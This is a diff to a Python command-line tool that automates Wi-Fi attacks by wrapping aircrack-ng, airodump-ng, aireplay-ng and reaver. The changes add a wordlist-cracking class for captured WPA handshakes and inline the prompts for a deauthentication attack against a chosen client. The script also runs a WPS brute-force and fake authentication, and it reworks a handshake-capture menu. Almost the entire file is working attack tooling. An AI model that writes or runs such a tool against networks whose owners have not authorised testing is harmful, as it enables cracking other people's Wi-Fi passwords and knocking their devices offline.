@@ -3,6 +3,22 @@ import re
 import argparse
 
 
+class WordlistAttackTool:
+    def __init__(self, handshake_file, wordlist_file):
+        self.handshake_file = handshake_file
+        self.wordlist_file = wordlist_file
+
+    def run_wordlist_attack(self):
+        """Perform wordlist attack using aircrack-ng"""
+        print("Performing wordlist attack...")
+
+        # Start wordlist attack using aircrack-ng
+        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
+        subprocess.call(cmd)
+
+        print("Wordlist attack completed.")
+
+
 class WirelessSecurityTool:
     def __init__(self, adapter):
         self.adapter = adapter
@@ -36,29 +52,15 @@ class WirelessSecurityTool:
         adapter_mac = input("[+] Input adapter MAC: ")
         channel = input("[+] Input channel of Wi-Fi network: ")
 
-        options = self.get_input()
-        self.deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac)
+        client_bssid = input("[+] Input client BSSID: ")
+        deauth_pack = int(input("[+] Input number of deauth packets: "))
+        client_mac = input("[+] Input client MAC address: ")
+
+        self.deauth_attack(client_bssid, deauth_pack, client_mac)
 
         subprocess.run(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', self.adapter, '-vvv',
                         '--no-associate'])
         subprocess.run(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, self.adapter])
-
-    def capture_handshake_process(self):
-        """Capture WPA handshake process"""
-        try:
-            print("[+] Press Control + C to stop scan")
-            subprocess.run(['airodump-ng', self.adapter])
-        except KeyboardInterrupt:
-            wifi_bssid = input("[+] Input BSSID of Wi-Fi: ")
-            channel = input("[+] Input Wi-Fi channel: ")
-            handshake_file = input("Enter name of handshake file: ")
-            subprocess.run(
-                ['airodump-ng', '--bssid', wifi_bssid, '--channel', channel, '--write', handshake_file, self.adapter])
-
-    def run_wordlist_attack(self):
-        handshake_file = input("[+] Input Handshake File Name: ")
-        wordlist_file = input("[+] Input Wordlist File: ")
-        subprocess.run(['aircrack-ng', handshake_file, '-w', wordlist_file])
 
     def run_wireless_security_tool(self):
         user_selection = self.get_user_selection()
@@ -70,34 +72,28 @@ class WirelessSecurityTool:
             except KeyboardInterrupt:
                 pass
 
-            self.capture_handshake()
         elif user_selection == '2':
             try:
-                self.capture_handshake_process()
+                self.capture_handshake()
             except KeyboardInterrupt:
-                print("Running Wordlist attack")
-                self.run_wordlist_attack()
+                pass
 
     @staticmethod
     def get_user_selection():
-        print("[+] Which vulnerability do you want to run:")
-        print("1. WPS")
-        print("2. Wordlist Attack")
+        print("[+] Which action do you want to perform:")
+        print("1. Check for WPS")
+        print("2. Capture Handshake")
         return input("Selection: ")
 
-    @staticmethod
-    def get_input():
-        """Get input"""
-        parser = argparse.ArgumentParser()
-        parser.add_argument("-a", "--client_bssid", help="specify client BSSID")
-        parser.add_argument("-p", "--deauth_pack", type=int, help="specify number of deauth packets")
-        parser.add_argument("-c", "--client_mac", help="specify client MAC address")
-        args = parser.parse_args()
 
-        if not all([args.client_bssid, args.deauth_pack, args.client_mac]):
-            parser.error("[-] Please provide all the required arguments. Use --help for more information.")
+def main():
+    adapter = input("[+] Input Wi-Fi adapter: ")
+    tool = WirelessSecurityTool(adapter)
+    tool.run_wireless_security_tool()
 
-        return args
+
+if __name__ == "__main__":
+    main()
 
 
 def main():
